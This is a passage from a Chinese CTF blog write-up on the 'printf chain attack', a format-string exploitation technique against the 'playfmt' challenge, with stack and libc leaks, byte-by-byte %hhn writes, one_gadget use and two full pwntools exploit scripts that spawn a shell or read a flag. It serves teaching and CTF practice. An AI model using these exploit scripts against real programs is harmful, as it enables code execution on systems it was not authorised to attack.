<span class="number">0xf7c56000</span> r-xp   <span class="number">100000</span> <span class="number">0</span>      /lib/i386-linux-gnu/libm<span class="number">-2.27</span>.so</span><br><span class="line"><span class="number">0xf7c56000</span> <span class="number">0xf7c57000</span> r--p     <span class="number">1000</span> ff000  /lib/i386-linux-gnu/libm<span class="number">-2.27</span>.so</span><br><span class="line"><span class="number">0xf7c57000</span> <span class="number">0xf7c58000</span> rw-p     <span class="number">1000</span> <span class="number">100000</span> /lib/i386-linux-gnu/libm<span class="number">-2.27</span>.so</span><br><span class="line"><span class="number">0xf7c58000</span> <span class="number">0xf7e2d000</span> r-xp   <span class="number">1</span>d5000 <span class="number">0</span>      /lib/i386-linux-gnu/libc<span class="number">-2.27</span>.so</span><br><span class="line"><span class="number">0xf7e2d000</span> <span class="number">0xf7e2e000</span> ---p     <span class="number">1000</span> <span class="number">1</span>d5000 /lib/i386-linux-gnu/libc<span class="number">-2.27</span>.so</span><br><span class="line"><span class="number">0xf7e2e000</span> <span class="number">0xf7e30000</span> r--p     <span class="number">2000</span> <span class="number">1</span>d5000 /lib/i386-linux-gnu/libc<span class="number">-2.27</span>.so</span><br><span class="line"><span class="number">0xf7e30000</span> <span class="number">0xf7e31000</span> rw-p     <span class="number">1000</span> <span class="number">1</span>d7000 /lib/i386-linux-gnu/libc<span class="number">-2.27</span>.so</span><br><span class="line"><span class="number">0xf7e31000</span> <span class="number">0xf7e34000</span> rw-p     <span class="number">3000</span> <span class="number">0</span>      </span><br><span class="line"><span class="number">0xf7e34000</span> <span class="number">0xf7fb0000</span> r-xp   <span class="number">17</span>c000 <span class="number">0</span>      /usr/lib32/libstdc++.so<span class="number">.6</span><span class="number">.0</span><span class="number">.25</span></span><br><span class="line"><span class="number">0xf7fb0000</span> <span class="number">0xf7fb6000</span> r--p     <span class="number">6000</span> <span class="number">17b</span>000 /usr/lib32/libstdc++.so<span class="number">.6</span><span class="number">.0</span><span class="number">.25</span></span><br><span class="line"><span class="number">0xf7fb6000</span> <span class="number">0xf7fb7000</span> rw-p     <span class="number">1000</span> <span class="number">181000</span> /usr/lib32/libstdc++.so<span class="number">.6</span><span class="number">.0</span><span class="number">.25</span></span><br><span class="line"><span class="number">0xf7fb7000</span> <span class="number">0xf7fba000</span> rw-p     <span class="number">3000</span> <span class="number">0</span>      </span><br><span class="line"><span class="number">0xf7fd0000</span> <span class="number">0xf7fd2000</span> rw-p     <span class="number">2000</span> <span class="number">0</span>      </span><br><span class="line"><span class="number">0xf7fd2000</span> <span class="number">0xf7fd5000</span> r--p     <span class="number">3000</span> <span class="number">0</span>      [vvar]</span><br><span class="line"><span class="number">0xf7fd5000</span> <span class="number">0xf7fd6000</span> r-xp     <span class="number">1000</span> <span class="number">0</span>      [vdso]</span><br><span class="line"><span class="number">0xf7fd6000</span> <span class="number">0xf7ffc000</span> r-xp    <span class="number">26000</span> <span class="number">0</span>      /lib/i386-linux-gnu/ld<span class="number">-2.27</span>.so</span><br><span class="line"><span class="number">0xf7ffc000</span> <span class="number">0xf7ffd000</span> r--p     <span class="number">1000</span> <span class="number">25000</span>  /lib/i386-linux-gnu/ld<span class="number">-2.27</span>.so</span><br><span class="line"><span class="number">0xf7ffd000</span> <span class="number">0xf7ffe000</span> rw-p     <span class="number">1000</span> <span class="number">26000</span>  /lib/i386-linux-gnu/ld<span class="number">-2.27</span>.so</span><br><span class="line"><span class="number">0xfff00000</span> <span class="number">0xffffe000</span> rw-p    fe000 <span class="number">0</span>      [<span class="built_in">stack</span>]</span><br></pre></td></tr></table></figure>
+
+<p>首先需要得到当前栈的地址和<code>libc</code>的基地址，这些地址可以很轻松的在栈上找到</p>
+<p>不难发现栈上有libc地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0xf7e30000 0xf7e31000 rw-p     1000 1d7000 /lib/i386-linux-gnu/libc-2.27.so</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">08:0020│      0xffffd050 —▸ 0xf7e30000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d7d6c</span><br></pre></td></tr></table></figure>
+
+<p>可知<code>esp+0x18</code>存放了栈地址，<code>esp+0x20</code>存放了<code>libc</code>的地址，根据32位栈溢出的公式可以得知</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">esp+0x18 : 0x18 / 4 = 8</span><br><span class="line">esp+0x20 : 0x20 / 4 = 8</span><br></pre></td></tr></table></figure>
+
+<p>可以得到分别是第6个参数和第8个参数，直接传入<code>%6$p%8$p</code>即可得到栈地址和<code>libc</code>地址</p>
+<p><strong>printf</strong>成链攻击的缺点就是需要很多次<strong>printf</strong>，但是如果你有任意地址读写权限后，相信做到这一点也并非难事 </p>
+<p>这里主要需要解决的就是如何将要改写的地址放在栈上。实现任意地址写需要依赖栈上存在一个链式结构</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0xffffd048-&gt;0xffffd068-&gt;0xffffd098</span><br></pre></td></tr></table></figure>
+
+<p>这三个地址都在栈上，我们就可以利用<code>printf</code>的<code>%n</code>对不同链层的数据进行修改，从而使得这条数据链可以指向任意地址 </p>
+<p>下图是一个简单的栈地址空间图，<code>offset</code>表示格式化的参数位置。通过第<code>offset0</code>个参数，利用<code>%hhn</code>可以控制<code>address1</code>的最低位，再通过第<code>offset1</code>个参数，利用<code>%hhn</code>可以写<code>address2</code>的最低位；然后通过<code>offset0</code>参数，利用<code>%hhn</code>修改<code>address1</code>的最低位为<code>原始值+1</code>，再通过<code>offset1</code>参数，利用<code>%hhn</code>可以写<code>address2</code>的次低位；依次循环即可完全控制<code>address2</code>的值，再次利用<code>address1和address2</code>的链式结构，即可实现对<code>address2</code>地址空间的任意写。对应到上面显示的地址空间</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">address0=0xffffd048,offset0=0x18/4=6;</span><br><span class="line">address1=0xffffd068,offset1=0x38/4=14;</span><br><span class="line">address2=0xffffd098,offset2=0x68/4=26;</span><br></pre></td></tr></table></figure>
+
+<p> <img src="https://p1.ssl.qhimg.com/t01027399ee82efa5dd.png" alt="img"> </p>
+<p>这里我用上面的数据链简单举个例，我们可以利用<code>0xffffd068—▸ 0xffffd098◂— 0x0</code>来修改<code>0xffffd098</code>地址的数据，但是<code>printf</code>的<code>%n</code>最大只能修改到<code>0x2000</code>，也就是说我们一般只能修改<code>一个byte</code>，原本这并没有什么用，但是别忘了，这是一条完整的数据链，我们可以利用<code>ebp  0xffffd048—▸ 0xffffd068—▸ 0xffffd098</code>修改<code>0xffffd068</code>的低地址数据（<code>0xffffd098</code>）的低地址，简单来说就是修改为<code>0xffffd099</code>，然后 <code>0xffffd068 —▸ 0xffffd098◂— 0x0</code>就会变成<code>0xffffd068 —▸ 0xffffd099◂— 0x0</code>，接下来我们就可以利用这条链修改<code>0xffffd099</code>地址的值，也就是<code>第二个byte</code>，依次类推，我们就能在栈上写任意地址，然后在用栈上的地址进行任意读写。就这样往往复复，造成了这个恶性循环。 </p>
+<p>简单来说就是一条栈数据链，前面的链功能是修改我们要任意读写的地址，后面的链的功能则是对前面修改出来的地址进行任意读写。 </p>
+<p>下面是地址写代码的实现，首先获取<code>address1</code>的最低位的原始值，然后依次写<code>address2</code>的各个字节</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">def write_address(off0,off1,target_addr):</span><br><span class="line">    io.sendline(&quot;%&#123;&#125;$p&quot;.format(off1))</span><br><span class="line">    io.recvuntil(&quot;0x&quot;)</span><br><span class="line">    addr1 = int(io.recv(8),16)&amp;0xff</span><br><span class="line">    io.recv()</span><br><span class="line">    for i in range(4):</span><br><span class="line">        io.sendline(&quot;%&#123;&#125;c%&#123;&#125;$hhn&quot;.format(addr1+i,off0))</span><br><span class="line">        io.recv()</span><br><span class="line">        io.sendline(&quot;%&#123;&#125;c%&#123;&#125;$hhn&quot;.format(target_addr&amp;0xff,off1))</span><br><span class="line">        io.recv()        </span><br><span class="line">        target_addr=target_addr&gt;&gt;8</span><br><span class="line">    io.sendline(&quot;%&#123;&#125;c%&#123;&#125;$hhn&quot;.format(addr1,off0))</span><br><span class="line">    io.recv()</span><br></pre></td></tr></table></figure>
+
+<p>这里需要介绍一下<strong>one_gadget</strong></p>
+<p><strong>one-gadget</strong> 是glibc里调用<code>execve(&#39;/bin/sh&#39;, NULL, NULL)</code>的一段非常有用的<strong>gadge</strong>t。在我们能够控制<strong>ip</strong>（也就是<strong>pc</strong>）的时候，用<strong>one-gadge</strong>t来做<strong>RCE</strong>（远程代码执行）非常方便，比如有时候我们能够做一个任意函数执行，但是做不到控制第一个参数，这样就没办法调用<code>system(&quot;sh&quot;)</code>，这个时候<strong>one gadget</strong>就可以搞定 </p>
+<p>再次运行<code>write_address</code>将<code>0xfff566cc</code>写上<code>one_gadget</code>地址</p>
+<p>最后输入<code>quit</code>退出循环，执行<code>return result</code>时就能获取shell</p>
+<p>由于我没拿到题目的<strong>libc</strong>，也没法真正的去做题所以大概就是先了解一下，借用一下别人的EXP</p>
+<p>官方EXP，里面有很多很方便值得学习的格式化字符串函数可以学习一下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = "debug"</span></span><br><span class="line">do_fmt_ebp_offset = <span class="number">6</span></span><br><span class="line">play_ebp_offset = <span class="number">14</span></span><br><span class="line">main_ebp_offset = <span class="number">26</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">format_offset</span><span class="params">(format_str , offset)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> format_str.replace(<span class="string">"&#123;&#125;"</span> , str(offset))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_target_offset_value</span><span class="params">(offset , name)</span>:</span></span><br><span class="line">    payload = format_offset(<span class="string">"%&#123;&#125;$p\x00"</span> , offset)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    text = p.recv()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        value = int(text.split(<span class="string">"\n"</span>)[<span class="number">0</span>] , <span class="number">16</span>)</span><br><span class="line">          print(name + <span class="string">" : "</span> + hex(value))</span><br><span class="line">        <span class="keyword">return</span> value</span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">        <span class="keyword">print</span> text</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modify_last_byte</span><span class="params">(last_byte , offset)</span>:</span></span><br><span class="line">    payload = <span class="string">"%"</span> + str(last_byte) + <span class="string">"c"</span> + format_offset(<span class="string">"%&#123;&#125;$hhn"</span> , offset)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.recv()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modify</span><span class="params">(addr , value , ebp_offset , ebp_1_offset)</span>:</span></span><br><span class="line">    addr_last_byte = addr &amp; <span class="number">0xff</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        now_value = (value &gt;&gt; i * <span class="number">8</span>) &amp; <span class="number">0xff</span></span><br><span class="line">        modify_last_byte(addr_last_byte + i ,  ebp_offset)</span><br><span class="line">        modify_last_byte(now_value , ebp_1_offset)</span><br><span class="line">p = process(<span class="string">"./playfmt"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./playfmt"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"=\n"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"=\n"</span>)</span><br><span class="line"><span class="comment"># leak ebp_1_addr then get ebp_addr</span></span><br><span class="line">play_ebp_addr = get_target_offset_value(do_fmt_ebp_offset,  <span class="string">"logo_ebp"</span>) </span><br><span class="line"><span class="comment"># get_ebp_addr</span></span><br><span class="line">main_ebp_addr = get_target_offset_value(do_fmt_ebp_offset,  <span class="string">"main_ebp"</span>)</span><br><span class="line"><span class="comment"># flag_class_ptr_addr = main_ebp_addr + 0x10</span></span><br><span class="line"><span class="comment"># flag_class_ptr_offset = main_ebp_offset - 4</span></span><br><span class="line">flag_class_ptr_offset = <span class="number">19</span></span><br><span class="line">flag_addr = get_target_offset_value(flag_class_ptr_offset , <span class="string">"flag_addr"</span>) - <span class="number">0x420</span></span><br><span class="line">log.info(hex(flag_addr))</span><br><span class="line"><span class="comment"># puts_plt = elf.plt["puts"]</span></span><br><span class="line">modify(main_ebp_addr + <span class="number">4</span> , flag_addr , do_fmt_ebp_offset , play_ebp_offset)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">payload = format_offset(<span class="string">"%&#123;&#125;$s\x00"</span> , play_ebp_offset + <span class="number">1</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="comment"># log.info("flag_addr : " + hex(flag_addr))</span></span><br><span class="line"><span class="comment"># p.sendline("quit")</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>另一种EXP</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io = remote('120.78.192.35', 9999)</span></span><br><span class="line">io = process(<span class="string">"./playfmt"</span>)</span><br><span class="line">elf = ELF(<span class="string">'./playfmt'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib32/libc-2.23.so'</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'DEBUG'</span></span><br><span class="line"><span class="comment">#gdb.attach(io,"b *0x0804889f")</span></span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">"%6$p%8$p"</span>)</span><br><span class="line">io.recvuntil(<span class="string">"0x"</span>)</span><br><span class="line">stack_addr = int(io.recv(<span class="number">8</span>),<span class="number">16</span>)<span class="number">-0xffffd648</span>+<span class="number">0xffffd610</span></span><br><span class="line">io.recvuntil(<span class="string">"0x"</span>)</span><br><span class="line">libc.address = int(io.recv(<span class="number">8</span>),<span class="number">16</span>)<span class="number">-0xf7e41000</span>+<span class="number">0xf7c91000</span></span><br><span class="line">log.success(<span class="string">"stack_addr:"</span>+hex(stack_addr))</span><br><span class="line">log.success(<span class="string">"libc_addr:"</span>+hex(libc.address))</span><br><span class="line">io.recv()</span><br><span class="line">offset0=<span class="number">0x18</span>/<span class="number">4</span></span><br><span class="line">offset1=<span class="number">0x38</span>/<span class="number">4</span></span><br><span class="line">offset2=<span class="number">0x68</span>/<span class="number">4</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_address</span><span class="params">(off0,off1,target_addr)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"%&#123;&#125;$p"</span>.format(off1))</span><br><span class="line">    io.recvuntil(<span class="string">"0x"</span>)</span><br><span class="line">    addr1 = int(io.recv(<span class="number">8</span>),<span class="number">16</span>)&amp;<span class="number">0xff</span></span><br><span class="line">    io.recv()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        io.sendline(<span class="string">"%&#123;&#125;c%&#123;&#125;$hhn"</span>.format(addr1+i,off0))</span><br><span class="line">        io.recv()</span><br><span class="line">        io.sendline(<span class="string">"%&#123;&#125;c%&#123;&#125;$hhn"</span>.format(target_addr&amp;<span class="number">0xff</span>,off1))</span><br><span class="line">        io.recv()        </span><br><span class="line">        target_addr=target_addr&gt;&gt;<span class="number">8</span></span><br><span class="line">    io.sendline(<span class="string">"%&#123;&#125;c%&#123;&#125;$hhn"</span>.format(addr1,off0))</span><br><span class="line">    io.recv()</span><br><span class="line"></span><br><span class="line">one_gadget = libc.address+ <span class="number">0x5f065</span></span><br><span class="line">print(hex(one_gadget))</span><br><span class="line">write_address(offset0,offset1,stack_addr+<span class="number">0x1c</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io,"b *0x0804889f")</span></span><br><span class="line">write_address(offset1,offset2,one_gadget)</span><br><span class="line">io.sendline(<span class="string">"quit"</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>注意：这里我特别强调一点，在单次<code>printf</code>操作中，是没有办法完成printf成链攻击的，因为单次<code>printf</code>时，一旦你对已经修改过的地址的值进行修改时，则要不就直接<code>crash</code>，要不就根本没反应，所以一定要多次<code>printf</code>才能完成该攻击方式。这是我自己尝试过的，然后单次就能完成printf成链攻击，那么这将是一个非常致命的漏洞 </p>
+</blockquote>
+<p>接下来简单说一下利用方式，<code>printf</code>成链攻击的实施一般至少需要两次<code>printf</code>才行（除非你运气好到爆棚，恰好有一个地址指向了函数的返回地址），第一次我们可以使<code>栈数据链</code>指向某个函数的返回地址，一般为了简单我们可以直接指向第二次<code>printf</code>的返回地址，由于栈布局是固定的，我们确实可以预测其返回地址。然后第二次printf操作时，便可以劫持其返回地址，然后重新返回<code>main</code>或者指向一个可以让<code>printf</code>复用的地址，然后我们就可以重复使用<code>printf</code>实现任意地址读写，这样就完成了一次<code>printf</code>成链攻击。 </p>
+<blockquote>
+<p>参考文章</p>
+<p>【1】非栈上格式化字符串漏洞利用技巧 ：<a href="https://www.anquanke.com/post/id/184717" target="_blank" rel="noopener">https://www.anquanke.com/post/id/184717</a></p>
+<p>【2】printf 成链攻击 ：<a href="http://blog.eonew.cn/archives/1196" target="_blank" rel="noopener">http://blog.eonew.cn/archives/1196</a></p>
+</blockquote>
+
+    </div>
+
+    
+    
+    
+        
+      
+
+      <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
+                <a href="/2019/11/06/EXP║═╡≈╩╘╡─╨í┐╙-1/" rel="next" title="EXP和调试的小坑-1">
+                  <i class="fa fa-chevron-left"></i> EXP和调试的小坑-1
+                </a>
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+                <a href="/2019/11/16/CTF-PWN-Tips-1/" rel="prev" title="CTF-PWN-Tips-1">
+                  CTF-PWN-Tips-1 <i class="fa fa-chevron-right"></i>
+                </a>
+              
+            </div>
+          </div>
+        
+      </footer>
+    
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+        
+        
+        
+        
+      
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Inhaltsverzeichnis
+        </li>
+        <li class="sidebar-nav-overview">
+          Übersicht
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">ZERO-A-ONE</p>
+  <div class="site-description" itemprop="description">Resit much,Obey little</div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">71</span>
+          <span class="site-state-item-name">Artikel</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">Kategorien</span>
+        
+      </div>
+    
+  </nav>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ZERO-A-ONE</span>
+</div>
+  <div class="powered-by">Erstellt mit  <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.9.0</div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">Design – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.4.0</div>
+
+<div>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span id="busuanzi_container_site_pv" style='display:none'>
+    本站总访问量 <span id="busuanzi_value_site_pv"></span> 次
+    <span class="post-meta-divider">|</span>
+</span>
+<span id="busuanzi_container_site_uv" style='display:none'>
+    有<span id="busuanzi_value_site_uv"></span>人看过我的博客啦
+</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+
+
+  <script src="/lib/anime.min.js?v=3.1.0"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+<script src="/js/utils.js?v=7.4.0"></script><script src="/js/motion.js?v=7.4.0"></script>
+<script src="/js/schemes/pisces.js?v=7.4.0"></script>
+
+<script src="/js/next-boot.js?v=7.4.0"></script>
+
+
+
+  
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.4.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
